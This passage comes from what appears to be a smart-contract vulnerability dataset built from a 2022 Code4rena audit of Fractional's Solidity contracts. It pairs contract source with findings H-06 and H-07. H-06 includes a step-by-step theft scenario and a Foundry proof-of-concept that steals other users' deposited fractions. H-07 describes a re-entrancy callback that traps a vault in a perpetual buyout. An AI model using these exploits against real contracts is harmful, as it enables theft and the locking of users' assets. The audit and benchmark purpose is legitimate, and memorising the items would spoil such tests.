List of module contracts\n    /// @return hashes Combined list of leaf nodes\n    function generateMerkleTree(address[] memory _modules)\n        public\n        view\n        returns (bytes32[] memory hashes)\n    {\n        uint256 treeLength;\n        uint256 modulesLength = _modules.length;\n\n        unchecked {\n            for (uint256 i; i < modulesLength; ++i) {\n                treeLength += IModule(_modules[i]).getLeafNodes().length;\n            }\n        }\n\n        uint256 counter;\n        hashes = new bytes32[](treeLength);\n        unchecked {\n            for (uint256 i; i < modulesLength; ++i) {\n                bytes32[] memory leaves = IModule(_modules[i]).getLeafNodes();\n                uint256 leavesLength = leaves.length;\n                for (uint256 j; j < leavesLength; ++j) {\n                    hashes[counter++] = leaves[j];\n                }\n            }\n        }\n    }\n\n    /// @notice Calculates the total amount of ether\n    /// @param _scalar Scalar used for multiplication\n    /// @param _lastTotalSupply Previous total fractional supply of the vault\n    /// @param _totalEth Total ether balance of the proposal\n    /// @param _totalFractions Total fractional balance of the proposal\n    /// @return Total amount of ether\n    function _calculateTotal(\n        uint256 _scalar,\n        uint256 _lastTotalSupply,\n        uint256 _totalEth,\n        uint256 _totalFractions\n    ) private pure returns (uint256) {\n        return\n            (_totalEth * _scalar) /\n            (_scalar - ((_totalFractions * _scalar) / _lastTotalSupply));\n    }\n\n    /// @notice Calculates the amount of ether contributed by the user\n    /// @param _totalInEth Total amount of ether\n    /// @param _lastTotalSupply Previous total fractional supply of the vault\n    /// @param _userProposalEth User balance of ether for the proposal\n    /// @param _userProposalFractions User balance of fractions for the proposal\n    /// @return Total contribution amount\n    function _calculateContribution(\n        uint256 _totalInEth,\n        uint256 _lastTotalSupply,\n        uint256 _userProposalEth,\n        uint256 _userProposalFractions\n    ) private pure returns (uint256) {\n        return\n            _userProposalEth +\n            (_userProposalFractions * _totalInEth) /\n            _lastTotalSupply;\n    }\n}\n\n\n",
        "CodeNames": [
            "Migration.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-06",
                "Location": [],
                "Type": " Any fractions deposited into any proposal can be stolen at any time until it is commited",
                "Description": "\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L210\n\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L73\n\n\nWhen buyout starts, it takes all fractions owned by proposer. This means that when Migration contract starts a buyout, it takes all fractions it has, not just the fractions from the proposal. This is easily exploitable by anyone.\n\nStealing fractions scenario:\n\n1.  Bob starts a proposal, deposits 3000 fractions\n2.  Alice immediately starts another proposal with targetPrice = 0, deposits 0 fractions and minimal ether (value: 1, which is 10^-18 ether)\n3.  Since price is larger than targetPrice, Alice immediately commits the proposal\n4.  Buyout is started, but instead of 0 fractions it has 3000 fractions from bob, because starting buyout took all Migration's fractions.\n5.  Alice immediately buys 3000 fractions from buyout for free (0 ether).\n6.  At this point Alice has successfully stolen all deposited fractions.\n\n\nAdd this code to test/Migration.t.sol\n\n    function testPanprogBugH4() public {\n    \tinitializeMigration(alice, bob, 10000, 10000, true);\n\n    \t(nftReceiverSelectors, nftReceiverPlugins) = initializeNFTReceiver();\n    \t// Migrate to a vault with no permissions (just to test out migration)\n    \taddress[] memory newModules = new address[(2);\n\n    \tnewModules[0] = migration;\n    \tnewModules[1] = modules[1];\n\n    \t// Bob makes the proposal\n    \tbob.migrationModule.propose(\n    \t\tvault,\n    \t\tnewModules,\n    \t\tnftReceiverPlugins,\n    \t\tnftReceiverSelectors,\n    \t\tTOTAL_SUPPLY * 2,\n    \t\t10 ether\n    \t);\n    \t// Bob joins the proposal with 3000 fractions\n    \tbob.migrationModule.join{value: 1 ether}(vault, 1, 3000);\n\n    \t// Alice starts a competing proposal (we use bob's data for simplicity)\n    \talice.migrationModule.propose(\n    \t\tvault,\n    \t\tnewModules,\n    \t\tnftReceiverPlugins,\n    \t\tnftReceiverSelectors,\n    \t\tTOTAL_SUPPLY * 10,\n    \t\t0 ether\n    \t);\n\n    \t// Alice joins her proposal with 0 fractions and minimum allowed ether (for the price to be above target)\n    \talice.migrationModule.join{value: 1}(vault, 2, 0);\n\n    \t// since the target price is reached, alice starts the buyout on her proposal\n    \talice.migrationModule.commit(vault, 2);\n\n    \t// at this point buyout should be empty, but in fact due to bug it has 3000 fractions from bob\n    \t// alice can now buy fractions from buyout for free (it should revert, but it doesn't)\n    \tvm.expectRevert(\n    \t\tabi.encodeWithSelector(IBuyout.InvalidPayment.selector)\n    \t);\n    \talice.buyoutModule.buyFractions(vault, 3000);\n    }\n\n",
                "Repair": "\nBuyout start function should include amount of fractions a proposer deposits, and Migration's commit function should specify correct fractions amount when starting a buyout.\n\nstevennevins (Fractional) confirmed(https://github.com/code-423n4/2022-07-fractional-findings/issues/619) \n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-07-fractional-findings/issues/183#issuecomment-1203228421):\n  An attacker can steal fractions that have that have been used to join a migration. Agree this is a High risk issue.\n \n Making this submission the primary instance for including a coded POC. \n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {Clone} from \"clones-with-immutable-args/src/Clone.sol\";\nimport {ERC1155} from \"@rari-capital/solmate/src/tokens/ERC1155.sol\";\nimport {IFERC1155} from \"./interfaces/IFERC1155.sol\";\nimport {INFTReceiver} from \"./interfaces/INFTReceiver.sol\";\nimport \"./constants/Permit.sol\";\n\n/// @title FERC1155\n/// @author Fractional Art\n/// @notice An ERC-1155 implementation for Fractions\ncontract FERC1155 is Clone, ERC1155, IFERC1155 {\n    /// @notice Name of the token contract\n    string public constant NAME = \"FERC1155\";\n    /// @notice Version number of the token contract\n    string public constant VERSION = \"1\";\n    /// @notice Address that can deploy new vaults for this collection, manage metadata, etc\n    address internal _controller;\n    /// @notice URI of contract metadata\n    string public contractURI;\n    /// @notice Mapping of token type approvals owner => operator => tokenId => approved\n    mapping(address => mapping(address => mapping(uint256 => bool)))\n        public isApproved;\n    /// @notice Mapping of metadata contracts for token ID types => metadata address\n    mapping(uint256 => address) public metadata;\n    /// @notice Mapping to track account nonces for metadata txs owner => nonces\n    mapping(address => uint256) public nonces;\n    /// @notice Mapping to track total supply for token ID types => totalSupply\n    mapping(uint256 => uint256) public totalSupply;\n    /// @notice Mapping to track royalty receivers for token ID types => royaltyAddress\n    mapping(uint256 => address) private royaltyAddress;\n    /// @notice Mapping to track the royalty percent for token ID types => royaltyPercent\n    mapping(uint256 => uint256) private royaltyPercent;\n\n    /// @notice Modifier for restricting function calls to the controller account\n    modifier onlyController() {\n        address controller_ = controller();\n        if (msg.sender != controller_)\n            revert InvalidSender(controller_, msg.sender);\n        _;\n    }\n\n    /// @notice Modifier for restricting function calls to the VaultRegistry\n    modifier onlyRegistry() {\n        address vaultRegistry = VAULT_REGISTRY();\n        if (msg.sender != vaultRegistry)\n            revert InvalidSender(vaultRegistry, msg.sender);\n        _;\n    }\n\n    /// @notice Burns fractions for an ID\n    /// @param _from Address to burn fraction tokens from\n    /// @param _id Token ID to burn\n    /// @param _amount Number of tokens to burn\n    function burn(\n        address _from,\n        uint256 _id,\n        uint256 _amount\n    ) external onlyRegistry {\n        _burn(_from, _id, _amount);\n        totalSupply[_id] -= _amount;\n    }\n\n    /// @notice Hook to emit the URI update when setting the metadata or updating\n    /// @param _id Token ID metadata was updated for\n    /// @param _uri URI of metadata\n    function emitSetURI(uint256 _id, string memory _uri) external {\n        if (msg.sender != metadata[_id])\n            revert InvalidSender(metadata[_id], msg.sender);\n        emit URI(_uri, _id);\n    }\n\n    /// @notice Mints new fractions for an ID\n    /// @param _to Address to mint fraction tokens to\n    /// @param _id Token ID to mint\n    /// @param _amount Number of tokens to mint\n    /// @param _data Extra calldata to include in the mint\n    function mint(\n        address _to,\n        uint256 _id,\n        uint256 _amount,\n        bytes memory _data\n    ) external onlyRegistry {\n        _mint(_to, _id, _amount, _data);\n        totalSupply[_id] += _amount;\n    }\n\n    /// @notice Permit function that approves an operator for token type with a valid signature\n    /// @param _owner Address of the owner of the token type\n    /// @param _operator Address of the spender of the token type\n    /// @param _id ID of the token type\n    /// @param _approved Approval status for the token type\n    /// @param _deadline Expiration of the signature\n    /// @param _v The recovery ID (129th byte and chain ID) of the signature used to recover the signer\n    /// @param _r The first 64 bytes of the signature\n    /// @param _s Bytes 64-128 of the signature\n    function permit(\n        address _owner,\n        address _operator,\n        uint256 _id,\n        bool _approved,\n        uint256 _deadline,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) external {\n        if (block.timestamp > _deadline)\n            revert SignatureExpired(block.timestamp, _deadline);\n\n        // cannot realistically overflow on human timescales\n        unchecked {\n            bytes32 structHash = _computePermitStructHash(\n                _owner,\n                _operator,\n                _id,\n                _approved,\n                _deadline\n            );\n\n            bytes32 digest = _computeDigest(\n                _computeDomainSeparator(),\n                structHash\n            );\n\n            address signer = ecrecover(digest, _v, _r, _s);\n\n            if (signer == address(0) || signer != _owner)\n                revert InvalidSignature(signer, _owner);\n        }\n\n        isApproved[_owner][_operator][_id] = _approved;\n\n        emit SingleApproval(_owner, _operator, _id, _approved);\n    }\n\n    /// @notice Permit function that approves an operator for all token types with a valid signature\n    /// @param _owner Address of the owner of the token type\n    /// @param _operator Address of the spender of the token type\n    /// @param _approved Approval status for the token type\n    /// @param _deadline Expiration of the signature\n    /// @param _v The recovery ID (129th byte and chain ID) of the signature used to recover the signer\n    /// @param _r The first 64 bytes of the signature\n    /// @param _s Bytes 64-128 of the signature\n    function permitAll(\n        address _owner,\n        address _operator,\n        bool _approved,\n        uint256 _deadline,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) external {\n        if (block.timestamp > _deadline)\n            revert SignatureExpired(block.timestamp, _deadline);\n\n        // cannot realistically overflow on human timescales\n        unchecked {\n            bytes32 structHash = _computePermitAllStructHash(\n                _owner,\n                _operator,\n                _approved,\n                _deadline\n            );\n\n            bytes32 digest = _computeDigest(\n                _computeDomainSeparator(),\n                structHash\n            );\n\n            address signer = ecrecover(digest, _v, _r, _s);\n\n            if (signer == address(0) || signer != _owner)\n                revert InvalidSignature(signer, _owner);\n        }\n\n        isApprovedForAll[_owner][_operator] = _approved;\n\n        emit ApprovalForAll(_owner, _operator, _approved);\n    }\n\n    /// @notice Scoped approvals allow us to eliminate some of the risks associated with setting the approval for an entire collection\n    /// @param _operator Address of spender account\n    /// @param _id ID of the token type\n    /// @param _approved Approval status for operator(spender) account\n    function setApprovalFor(\n        address _operator,\n        uint256 _id,\n        bool _approved\n    ) external {\n        isApproved[msg.sender][_operator][_id] = _approved;\n\n        emit SingleApproval(msg.sender, _operator, _id, _approved);\n    }\n\n    /// @notice Sets the contract metadata\n    /// @param _uri URI of metadata\n    function setContractURI(string calldata _uri) external onlyController {\n        contractURI = _uri;\n    }\n\n    /// @notice Sets the token metadata contract\n    /// @param _metadata Address for metadata contract\n    /// @param _id Token ID to set the metadata for\n    function setMetadata(address _metadata, uint256 _id)\n        external\n        onlyController\n    {\n        metadata[_id] = _metadata;\n        emit SetMetadata(_metadata, _id);\n    }\n\n    /// @notice Sets the token royalties\n    /// @param _id Token ID royalties are being updated for\n    /// @param _receiver Address to receive royalties\n    /// @param _percentage Percentage of royalties on secondary sales\n    function setRoyalties(\n        uint256 _id,\n        address _receiver,\n        uint256 _percentage\n    ) external onlyController {\n        royaltyAddress[_id] = _receiver;\n        royaltyPercent[_id] = _percentage;\n        emit SetRoyalty(_receiver, _id, _percentage);\n    }\n\n    /// @notice Updates the controller address for the FERC1155 token contract\n    /// @param _newController Address of new controlling entity\n    function transferController(address _newController)\n        external\n        onlyController\n    {\n        if (_newController == address(0)) revert ZeroAddress();\n        _controller = _newController;\n        emit ControllerTransferred(_newController);\n    }\n\n    /// @notice Sets the token royalties\n    /// @param _id Token ID royalties are being updated for\n    /// @param _salePrice Sale price to calculate the royalty for\n    function royaltyInfo(uint256 _id, uint256 _salePrice)\n        external\n        view\n        returns (address receiver, uint256 royaltyAmount)\n    {\n        receiver = royaltyAddress[_id];\n        royaltyAmount = (_salePrice * royaltyPercent[_id]) / 100;\n    }\n\n    /// @notice Transfer an amount of a token type between two accounts\n    /// @param _from Source address for an amount of tokens\n    /// @param _to Destination address for an amount of tokens\n    /// @param _id ID of the token type\n    /// @param _amount The amount of tokens being transferred\n    /// @param _data Additional calldata\n    function safeTransferFrom(\n        address _from,\n        address _to,\n        uint256 _id,\n        uint256 _amount,\n        bytes memory _data\n    ) public override(ERC1155, IFERC1155) {\n        require(\n            msg.sender == _from ||\n                isApprovedForAll[_from][msg.sender] ||\n                isApproved[_from][msg.sender][_id],\n            \"NOT_AUTHORIZED\"\n        );\n\n        balanceOf[_from][_id] -= _amount;\n        balanceOf[_to][_id] += _amount;\n\n        emit TransferSingle(msg.sender, _from, _to, _id, _amount);\n\n        require(\n            _to.code.length == 0\n                ? _to != address(0)\n                : INFTReceiver(_to).onERC1155Received(\n                    msg.sender,\n                    _from,\n                    _id,\n                    _amount,\n                    _data\n                ) == INFTReceiver.onERC1155Received.selector,\n            \"UNSAFE_RECIPIENT\"\n        );\n    }\n\n    /// @notice Getter for URI of a token type\n    /// @param _id ID of the token type\n    function uri(uint256 _id)\n        public\n        view\n        override(ERC1155, IFERC1155)\n        returns (string memory)\n    {\n        require(metadata[_id] != address(0), \"NO METADATA\");\n        return IFERC1155(metadata[_id]).uri(_id);\n    }\n\n    /// @notice Getter for controller account\n    function controller() public view returns (address controllerAddress) {\n        _controller == address(0)\n            ? controllerAddress = INITIAL_CONTROLLER()\n            : controllerAddress = _controller;\n    }\n\n    /// @notice Getter for initial controller account immutable argument stored in calldata\n    function INITIAL_CONTROLLER() public pure returns (address) {\n        return _getArgAddress(0);\n    }\n\n    /// @notice VaultRegistry address that is allowed to call mint() and burn()\n    function VAULT_REGISTRY() public pure returns (address) {\n        return _getArgAddress(20);\n    }\n\n    /// @dev Computes hash of permit struct\n    /// @param _owner Address of the owner of the token type\n    /// @param _operator Address of the spender of the token type\n    /// @param _id ID of the token type\n    /// @param _approved Approval status for the token type\n    /// @param _deadline Expiration of the signature\n    function _computePermitStructHash(\n        address _owner,\n        address _operator,\n        uint256 _id,\n        bool _approved,\n        uint256 _deadline\n    ) internal returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    PERMIT_TYPEHASH,\n                    _owner,\n                    _operator,\n                    _id,\n                    _approved,\n                    nonces[_owner]++,\n                    _deadline\n                )\n            );\n    }\n\n    /// @dev Computes hash of permit all struct\n    /// @param _owner Address of the owner of the token type\n    /// @param _operator Address of the spender of the token type\n    /// @param _approved Approval status for the token type\n    /// @param _deadline Expiration of the signature\n    function _computePermitAllStructHash(\n        address _owner,\n        address _operator,\n        bool _approved,\n        uint256 _deadline\n    ) internal returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    PERMIT_ALL_TYPEHASH,\n                    _owner,\n                    _operator,\n                    _approved,\n                    nonces[_owner]++,\n                    _deadline\n                )\n            );\n    }\n\n    /// @dev Computes domain separator to prevent signature collisions\n    /// @return Hash of the contract-specific fields\n    function _computeDomainSeparator() internal view returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    DOMAIN_TYPEHASH,\n                    keccak256(bytes(NAME)),\n                    keccak256(bytes(VERSION)),\n                    block.chainid,\n                    address(this)\n                )\n            );\n    }\n\n    /// @dev Computes digest of domain separator and struct hash\n    /// @param _domainSeparator Hash of contract-specific fields\n    /// @param _structHash Hash of signature fields struct\n    /// @return Hash of the signature digest\n    function _computeDigest(bytes32 _domainSeparator, bytes32 _structHash)\n        internal\n        pure\n        returns (bytes32)\n    {\n        return\n            keccak256(\n                abi.encodePacked(\"\\x19\\x01\", _domainSeparator, _structHash)\n            );\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {ISupply} from \"../interfaces/ISupply.sol\";\nimport {IVaultRegistry} from \"../interfaces/IVaultRegistry.sol\";\nimport \"../constants/Supply.sol\";\n\n/// @title Supply\n/// @author Fractional Art\n/// @notice Target contract for minting and burning fractional tokens\ncontract Supply is ISupply {\n    /// @notice Address of VaultRegistry contract\n    address immutable registry;\n\n    /// @notice Initializes registry contract\n    constructor(address _registry) {\n        registry = _registry;\n    }\n\n    /// @notice Mints fractional tokens\n    /// @param _to Target address\n    /// @param _value Transfer amount\n    function mint(address _to, uint256 _value) external {\n        // Utilize assembly to perform an optimized Vault Registry mint\n        address _registry = registry;\n\n        assembly {\n            // Write calldata to the free memory pointer, but restore it later.\n            let memPointer := mload(FREE_MEMORY_POINTER_SLOT)\n\n            // Write calldata into memory, starting with the function selector\n            mstore(REGISTRY_MINT_SIG_PTR, REGISTRY_MINT_SIGNATURE)\n            mstore(REGISTRY_MINT_TO_PRT, _to) // Append the \"_to\" argument\n            mstore(REGISTRY_MINT_VALUE_PTR, _value) // Append the \"_value\" argument\n\n            let success := call(\n                gas(),\n                _registry,\n                0,\n                REGISTRY_MINT_SIG_PTR,\n                REGISTRY_MINT_LENGTH,\n                0,\n                0\n            )\n\n            // If the mint reverted\n            if iszero(success) {\n                // If it returned a message, bubble it up as long as sufficient\n                // gas remains to do so:\n                if returndatasize() {\n                    // Ensure that sufficient gas is available to copy\n                    // returndata while expanding memory where necessary. Start\n                    // by computing word size of returndata & allocated memory.\n                    let returnDataWords := div(returndatasize(), ONE_WORD)\n\n                    // Note: use the free memory pointer in place of msize() to\n                    // work around a Yul warning that prevents accessing msize\n                    // directly when the IR pipeline is activated.\n                    let msizeWords := div(memPointer, ONE_WORD)\n\n                    // Next, compute the cost of the returndatacopy.\n                    let cost := mul(COST_PER_WORD, returnDataWords)\n\n                    // Then, compute cost of new memory allocation.\n                    if gt(returnDataWords, msizeWords) {\n                        cost := add(\n                            cost,\n                            add(\n                                mul(\n                                    sub(returnDataWords, msizeWords),\n                                    COST_PER_WORD\n                                ),\n                                div(\n                                    sub(\n                                        mul(returnDataWords, returnDataWords),\n                                        mul(msizeWords, msizeWords)\n                                    ),\n                                    MEMORY_EXPANSION_COEFFICIENT\n                                )\n                            )\n                        )\n                    }\n\n                    // Finally, add a small constant and compare to gas\n                    // remaining; bubble up the revert data if enough gas is\n                    // still available.\n                    if lt(add(cost, EXTRA_GAS_BUFFER), gas()) {\n                        // Copy returndata to memory; overwrite existing memory.\n                        returndatacopy(0, 0, returndatasize())\n\n                        // Revert, giving memory region with copied returndata.\n                        revert(0, returndatasize())\n                    }\n                }\n\n                // Otherwise revert with a generic error message\n                mstore(MINT_ERROR_SIG_PTR, MINT_ERROR_SIGNATURE)\n                mstore(MINT_ERROR_ACCOUNT_PTR, _to)\n                revert(MINT_ERROR_SIG_PTR, MINT_ERROR_LENGTH)\n            }\n\n            // Restore the original free memory pointer.\n            mstore(FREE_MEMORY_POINTER_SLOT, memPointer)\n\n            // Restore the zero slot to zero.\n            mstore(ZERO_SLOT, 0)\n        }\n    }\n\n    /// @notice Burns fractional tokens\n    /// @param _from Source address\n    /// @param _value Burn amount\n    function burn(address _from, uint256 _value) external {\n        // Utilize assembly to perform an optimized Vault Registry burn\n        address _registry = registry;\n\n        assembly {\n            // Write calldata to the free memory pointer, but restore it later.\n            let memPointer := mload(FREE_MEMORY_POINTER_SLOT)\n\n            // Write calldata into memory, starting with the function selector\n            mstore(REGISTRY_BURN_SIG_PTR, REGISTRY_BURN_SIGNATURE)\n            mstore(REGISTRY_BURN_FROM_PTR, _from) // Append the \"_from\" argument\n            mstore(REGISTRY_BURN_VALUE_PTR, _value) // Append the \"_value\" argument\n\n            let success := call(\n                gas(),\n                _registry,\n                0,\n                REGISTRY_BURN_SIG_PTR,\n                REGISTRY_BURN_LENGTH,\n                0,\n                0\n            )\n\n            // If the mint reverted\n            if iszero(success) {\n                // If it returned a message, bubble it up as long as sufficient\n                // gas remains to do so:\n                if returndatasize() {\n                    // Ensure that sufficient gas is available to copy\n                    // returndata while expanding memory where necessary. Start\n                    // by computing word size of returndata & allocated memory.\n                    let returnDataWords := div(returndatasize(), ONE_WORD)\n\n                    // Note: use the free memory pointer in place of msize() to\n                    // work around a Yul warning that prevents accessing msize\n                    // directly when the IR pipeline is activated.\n                    let msizeWords := div(memPointer, ONE_WORD)\n\n                    // Next, compute the cost of the returndatacopy.\n                    let cost := mul(COST_PER_WORD, returnDataWords)\n\n                    // Then, compute cost of new memory allocation.\n                    if gt(returnDataWords, msizeWords) {\n                        cost := add(\n                            cost,\n                            add(\n                                mul(\n                                    sub(returnDataWords, msizeWords),\n                                    COST_PER_WORD\n                                ),\n                                div(\n                                    sub(\n                                        mul(returnDataWords, returnDataWords),\n                                        mul(msizeWords, msizeWords)\n                                    ),\n                                    MEMORY_EXPANSION_COEFFICIENT\n                                )\n                            )\n                        )\n                    }\n\n                    // Finally, add a small constant and compare to gas\n                    // remaining; bubble up the revert data if enough gas is\n                    // still available.\n                    if lt(add(cost, EXTRA_GAS_BUFFER), gas()) {\n                        // Copy returndata to memory; overwrite existing memory.\n                        returndatacopy(0, 0, returndatasize())\n\n                        // Revert, giving memory region with copied returndata.\n                        revert(0, returndatasize())\n                    }\n                }\n\n                // Otherwise revert with a generic error message\n                mstore(BURN_ERROR_SIG_PTR, BURN_ERROR_SIGNATURE)\n                mstore(BURN_ERROR_ACCOUNT_PTR, _from)\n                revert(BURN_ERROR_SIG_PTR, BURN_ERROR_LENGTH)\n            }\n\n            // Restore the original free memory pointer.\n            mstore(FREE_MEMORY_POINTER_SLOT, memPointer)\n\n            // Restore the zero slot to zero.\n            mstore(ZERO_SLOT, 0)\n        }\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {IModule} from \"./IModule.sol\";\nimport {Permission} from \"./IVaultRegistry.sol\";\n\n/// @dev Possible states that a buyout auction may have\nenum State {\n    INACTIVE,\n    LIVE,\n    SUCCESS\n}\n\n/// @dev Auction information\nstruct Auction {\n    // Time of when buyout begins\n    uint256 startTime;\n    // Address of proposer creating buyout\n    address proposer;\n    // Enum state of the buyout auction\n    State state;\n    // Price of fractional tokens\n    uint256 fractionPrice;\n    // Balance of ether in buyout pool\n    uint256 ethBalance;\n    // Total supply recorded before a buyout started\n    uint256 lastTotalSupply;\n}\n\n/// @dev Interface for Buyout module contract\ninterface IBuyout is IModule {\n    /// @dev Emitted when the payment amount does not equal the fractional price\n    error InvalidPayment();\n    /// @dev Emitted when the buyout state is invalid\n    error InvalidState(State _required, State _current);\n    /// @dev Emitted when the caller has no balance of fractional tokens\n    error NoFractions();\n    /// @dev Emitted when the caller is not the winner of an auction\n    error NotWinner();\n    /// @dev Emitted when the address is not a registered vault\n    error NotVault(address _vault);\n    /// @dev Emitted when the time has expired for selling and buying fractions\n    error TimeExpired(uint256 _current, uint256 _deadline);\n    /// @dev Emitted when the buyout auction is still active\n    error TimeNotElapsed(uint256 _current, uint256 _deadline);\n    /// @dev Emitted when ether deposit amount for starting a buyout is zero\n    error ZeroDeposit();\n\n    /// @dev Event log for starting a buyout\n    /// @param _vault Address of the vault\n    /// @param _proposer Address that created the buyout\n    /// @param _startTime Timestamp of when buyout was created\n    /// @param _buyoutPrice Price of buyout pool in ether\n    /// @param _fractionPrice Price of fractional tokens\n    event Start(\n        address indexed _vault,\n        address indexed _proposer,\n        uint256 _startTime,\n        uint256 _buyoutPrice,\n        uint256 _fractionPrice\n    );\n    /// @dev Event log for selling fractional tokens into the buyout pool\n    /// @param _seller Address selling fractions\n    /// @param _amount Transfer amount being sold\n    event SellFractions(address indexed _seller, uint256 _amount);\n    /// @dev Event log for buying fractional tokens from the buyout pool\n    /// @param _buyer Address buying fractions\n    /// @param _amount Transfer amount being bought\n    event BuyFractions(address indexed _buyer, uint256 _amount);\n    /// @dev Event log for ending an active buyout\n    /// @param _vault Address of the vault\n    /// @param _state Enum state of auction\n    /// @param _proposer Address that created the buyout\n    event End(address _vault, State _state, address indexed _proposer);\n    /// @dev Event log for cashing out ether for fractions from a successful buyout\n    /// @param _vault Address of the vault\n    /// @param _casher Address cashing out of buyout\n    /// @param _amount Transfer amount of ether\n    event Cash(address _vault, address indexed _casher, uint256 _amount);\n    /// @dev Event log for redeeming the underlying vault assets from an inactive buyout\n    /// @param _vault Address of the vault\n    /// @param _redeemer Address redeeming underlying assets\n    event Redeem(address _vault, address indexed _redeemer);\n\n    function PROPOSAL_PERIOD() external view returns (uint256);\n\n    function REJECTION_PERIOD() external view returns (uint256);\n\n    function batchWithdrawERC1155(\n        address _vault,\n        address _token,\n        address _to,\n        uint256[] memory _ids,\n        uint256[] memory _values,\n        bytes32[] memory _erc1155BatchTransferProof\n    ) external;\n\n    function buyFractions(address _vault, uint256 _amount) external payable;\n\n    function buyoutInfo(address)\n        external\n        view\n        returns (\n            uint256 startTime,\n            address proposer,\n            State state,\n            uint256 fractionPrice,\n            uint256 ethBalance,\n            uint256 lastTotalSupply\n        );\n\n    function cash(address _vault, bytes32[] memory _burnProof) external;\n\n    function end(address _vault, bytes32[] memory _burnProof) external;\n\n    function getLeafNodes() external view returns (bytes32[] memory nodes);\n\n    function getPermissions()\n        external\n        view\n        returns (Permission[] memory permissions);\n\n    function redeem(address _vault, bytes32[] memory _burnProof) external;\n\n    function registry() external view returns (address);\n\n    function sellFractions(address _vault, uint256 _amount) external;\n\n    function start(address _vault) external payable;\n\n    function supply() external view returns (address);\n\n    function transfer() external view returns (address);\n\n    function withdrawERC20(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _value,\n        bytes32[] memory _erc20TransferProof\n    ) external;\n\n    function withdrawERC721(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _tokenId,\n        bytes32[] memory _erc721TransferProof\n    ) external;\n\n    function withdrawERC1155(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _id,\n        uint256 _value,\n        bytes32[] memory _erc1155TransferProof\n    ) external;\n}\n\n\n// SPDX-License-Identifier: Unlicense\npragma solidity 0.8.13;\n\nimport {SafeSend} from \"../utils/SafeSend.sol\";\n\ncontract MockSender is SafeSend {\n    function sendEthOrWeth(address to, uint256 value) external {\n        _sendEthOrWeth(to, value);\n    }\n\n    receive() external payable {}\n}\n\n\n",
        "CodeNames": [
            "FERC1155.sol",
            "Supply.sol",
            "IBuyout.sol",
            "MockSender.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-07",
                "Location": [
                    "receive",
                    "end",
                    "sellFractions",
                    "vault",
                    "onERC",
                    "buyoutInfo",
                    "proposer",
                    "_sendEthOrWeth",
                    "start"
                ],
                "Type": " Proposer can  start  a perpetual buyout which can only  end  if the auction succeeds and is not rejected",
                "Description": "\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L39\n\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L66-L68\n\n<https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L235\n\n\nA user can start a perpetual buyout that cannot be stopped except by making the buyout succeed. This can be done by creating a malicious contract that will call back to start when it receives ETH via its receive function. The user then starts the perpetual buyout by calling start from the malicious contract.\n\nAssume the rejection period has passed and the auction pool is not large enough (i.e. < 50%). If end is called then the method _sendEthOrWeth will attempt to send ETH to the malicious contract. The contract will simply call back to start sending the ETH it has just received.\n\nThe impact is that end can never be called on this buyout proposal if the buyout auction has failed. Worse, no new buyout proposal can be made since the current one is still live, and it is never in a state where it is not live.\n\nThe others users will either need to accept that assets are locked inside the vault, or that they will need to sellFractions in order to make the buyout succeed.\n\n\n*   Each vault can only have one buyoutInfo associated with it as can be seen on line 39(https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L39).\n*   A new buyout proposal cannot be made unless the buyoutInfo state is State.INACTIVE as can be seen in lines 66-68(https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L66-L68)\n*   A proposer makes a proposal by calling start. They do this from a smart contract that simply calls start again when its receive function is called.\n*   If the proposer fails to get over 50% then, when end is called, _sendEthOrWeth is called using the proposer value which is the smart contract that re-enters. See line 235(https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L235). _sendETHOrWeth is cleverly written so that if receive were to revert the reversion would not \"bubble up\". However, it does not protect against re-entrancy.\n*   This means that buyoutInfo[vault] can never be overwritten. It is permanently stuck in state State.LIVE meaning that start can never be called for vault by anyone else.\n*   The only way out of this conundrum is for the other users of the vault to sellFractions to make the auction succeed or to accept that assets are locked in the vault forever.\n\nA foundry test(https://github.com/sseefried/codearena-2022-07-fractional/blob/446fb54c6dbb0facfe40802a280de9e133f69589/test/BugsBuyout.t.sol#L45-L74) exhibiting this attack has been written in a private fork of the contest repo.\n\nNote that onERC1155Received needs to be implemented in the malicious contract.\n\n\nManual inspection + Foundry\n\n",
